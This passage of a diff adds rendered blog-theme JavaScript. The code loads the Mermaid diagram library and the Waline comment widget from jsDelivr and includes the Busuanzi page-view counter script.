+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: '',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
